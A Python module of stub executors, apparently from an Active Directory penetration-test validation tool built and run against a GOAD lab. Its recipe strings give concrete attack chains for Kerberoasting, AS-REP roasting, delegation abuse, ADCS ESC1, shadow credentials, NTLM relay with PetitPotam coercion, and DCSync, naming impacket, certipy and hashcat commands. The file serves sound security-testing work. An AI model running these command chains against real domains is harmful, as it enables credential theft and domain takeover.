"""Stub validation executors -- recipe documented (#66146), not yet wired.

Each class below is a real, importable :class:`ValidationExecutor` whose metadata
(technique / class / terminal kind / mutating / recipe) is filled in from the
PROVEN recipes (claude-mem #66146) so the orchestrator can list and plan them,
but whose :meth:`execute` raises :class:`StubNotImplemented`. The base-class
``run`` catches that and emits an honest *incomplete* receipt (the scorer reads
it as ``inconclusive``/``stub_not_implemented``), never a fabricated proof.

To implement one: mirror ``rbcd.py`` -- declare ``param_specs`` with
recommended-default + override params, encode the recipe steps through
``ctx.runner``, gate mutating ops, add a verified rollback if mutating, and
build the terminal fact. Replace the ``execute`` body. TODOs mark each.

Recipe status (#66146): PROVED = C1 ADCS, C3 kerberoast, C4 asrep,
C6 constrained-deleg, C7 RBCD (done, rbcd.py), C9 shadow, C11 openshares;
C10 LAPS inconclusive (lab quirk); C2 relay / C5 unconstrained / C8 coercion
recipe-known-not-run.
"""
from __future__ import annotations

from ..recommend import ParamSpec
from .base import ValidationExecutor, ExecutorContext, StubNotImplemented


class _Stub(ValidationExecutor):
    """Shared stub body. Subclasses set the class attrs + (optionally) params."""

    def param_specs(self, ctx: ExecutorContext, finding) -> list[ParamSpec]:
        # TODO: declare the overridable params this technique needs, each with a
        # recommended default derived from ctx.config (see rbcd.py.param_specs).
        return []

    def execute(self, ctx: ExecutorContext, finding, params) -> dict:
        raise StubNotImplemented(
            f"{self.technique} executor not implemented; recipe: {self.recipe_ref}")


class KerberoastExecutor(_Stub):
    technique = "KERBEROAST"
    technique_class = "kerberoast"
    terminal_kind = "authn_success"
    mutating = False
    verified_recipe = True
    recipe_ref = ("#66146 KERBEROAST = impacket-GetUserSPNs -request -> $krb5tgs$ "
                  "-> hashcat -m 13100 rockyou -> reauth nxc smb (PROVED jon.snow)")
    # TODO: params -> {wordlist (recommended rockyou), reauth_target}. Cracking is
    # opt-in/offline (#66120); terminal = re-auth as the cracked SPN user.


class ASREPExecutor(_Stub):
    technique = "ASREP"
    technique_class = "asrep"
    terminal_kind = "authn_success"
    mutating = False
    verified_recipe = True
    recipe_ref = ("#66146 ASREP = impacket-GetNPUsers -request -> hashcat -m 18200 "
                  "-> reauth (PROVED brandon.stark + missandei)")
    # TODO: params -> {wordlist, reauth_target}; crack is opt-in/offline.


class ConstrainedDelegExecutor(_Stub):
    technique = "CONSTRAINED-DELEG-PT"
    technique_class = "delegation"
    terminal_kind = "authn_success"
    mutating = False
    verified_recipe = True
    recipe_ref = ("#66146 CONSTRAINED-DELEG-PT = impacket-getST -spn cifs/<svc> "
                  "-impersonate <target> <dom>/<deleg-principal>:<pw> (unset "
                  "KRB5CCNAME) -> nxc smb <t> -k --use-kcache (PROVED jon.snow->Administrator)")
    # TODO: params -> {impersonate (recommended Administrator / supplied user),
    # target_spn (recommended cifs/<allowed-host>)}. Non-mutating; no rollback.


class ADCSESC1Executor(_Stub):
    technique = "ADCS-ESC1"
    technique_class = "adcs"
    terminal_kind = "cert_issued_and_used"
    mutating = True
    verified_recipe = True
    recipe_ref = ("#66146 ADCS-ESC1 = certipy-ad req -template ESC1 -upn <target>@<dom> "
                  "-ca <CA> -target <cahost> ; certipy-ad auth -pfx -> PKINIT TGT+NThash ; "
                  "nxc smb -k ; ROLLBACK certutil -revoke <serial> via PtH (PROVED essos admin)")
    # TODO: params -> {template (from finding.entity.esc/template), upn/impersonate
    # (recommended Administrator), ca, ca_host}. Mutating (cert issued) -> rollback
    # = certutil -revoke the issued serial; gotcha: -ldap-scheme ldap on Win2016.


class ShadowCredsExecutor(_Stub):
    technique = "SHADOW-CREDS"
    technique_class = "shadow_creds"
    terminal_kind = "secret_recovered"
    mutating = True
    verified_recipe = True
    recipe_ref = ("#66146 SHADOW-CREDS = certipy-ad shadow auto -account <computer$> "
                  "(add KeyCredentialLink -> PKINIT -> hash -> auto-restore) (PROVED braavos$)")
    # TODO: params -> {account (victim computer$/user from finding.host)}.
    # `shadow auto` adds+restores msDS-KeyCredentialLink itself; the executor must
    # still assert rollback.verified from the restore step.


class LAPSExecutor(_Stub):
    technique = "LAPS"
    technique_class = "laps"
    terminal_kind = "authn_success"
    mutating = False
    verified_recipe = False   # PROVED read; login inconclusive (GOAD lab quirk, #66146)
    recipe_ref = ("#66146 LAPS = impacket-GetLAPSPassword -> login (READ proved braavos; "
                  "login inconclusive: AD attr not synced to local SAM in GOAD)")
    # TODO: params -> {target_host (from finding.host), local_admin (recommended
    # 'administrator')}. ms-Mcs-AdmPwd read was DENIED once by the classifier
    # (#66119) -> expect a gate; surface it, never work around it.


class OpenSharesExecutor(_Stub):
    technique = "OPENSHARES-WRITE"
    technique_class = "openshares"
    terminal_kind = "file_write_readback"
    mutating = True
    verified_recipe = True
    recipe_ref = ("#66146 OPENSHARES-WRITE = smbclient //<member>/<share> put/get/del "
                  "canary (PROVED braavos all)")
    # TODO: params -> {share (from finding.entity.share), canary_name (recommended
    # a unique random name)}. Mutating (writes a file) -> rollback = delete the
    # canary; verify read-back returns not-found.


class CoercionExecutor(_Stub):
    technique = "COERCION"
    technique_class = "coerce"
    terminal_kind = "authn_success"
    mutating = False
    verified_recipe = False   # recipe-known-not-run (#66146)
    recipe_ref = "#66146 COERCION = Coercer/PetitPotam trigger -> captured auth is the proof"
    # TODO: params -> {victim (DC from finding.host), listener_ip (recommended the
    # operator host)}. Pairs with NTLM-RELAY (feeds the listener).


class NTLMRelayExecutor(_Stub):
    technique = "NTLM-RELAY"
    technique_class = "relay"
    terminal_kind = "replication_dump"   # or rbcd_access (facet accepts both)
    mutating = False
    verified_recipe = False   # recipe-known-not-run (#66146)
    recipe_ref = ("#66146 NTLM-RELAY = impacket-ntlmrelayx listener + coercion -> relay "
                  "to LDAP(RBCD)/SMB; terminal = SAM dump (replication_dump) or LDAP "
                  "RBCD write (rbcd_access, mutating -> rollback)")
    # TODO: params -> {relay_target (from finding.host, signing-off), mode LDAP|SMB}.
    # LDAP-RBCD mode mutates -> rollback required; SMB-SAM-dump mode is read-only.


class UnconstrainedDelegExecutor(_Stub):
    technique = "UNCONSTRAINED-DELEG"
    technique_class = "delegation"
    terminal_kind = "replication_dump"
    mutating = False
    verified_recipe = False   # recipe-known-not-run (#66146)
    recipe_ref = ("#66146 UNCONSTRAINED-DELEG = coerce DC -> capture TGT on unconstrained "
                  "host -> secretsdump DCSync")
    # TODO: params -> {victim_dc (from finding.host), unconstrained_host}. Terminal =
    # DCSync replication dump; coercion sub-step reuses CoercionExecutor's recipe.


STUB_EXECUTORS: dict[str, type[ValidationExecutor]] = {
    cls.technique: cls for cls in (
        KerberoastExecutor, ASREPExecutor, ConstrainedDelegExecutor, ADCSESC1Executor,
        ShadowCredsExecutor, LAPSExecutor, OpenSharesExecutor, CoercionExecutor,
        NTLMRelayExecutor, UnconstrainedDelegExecutor,
    )
}
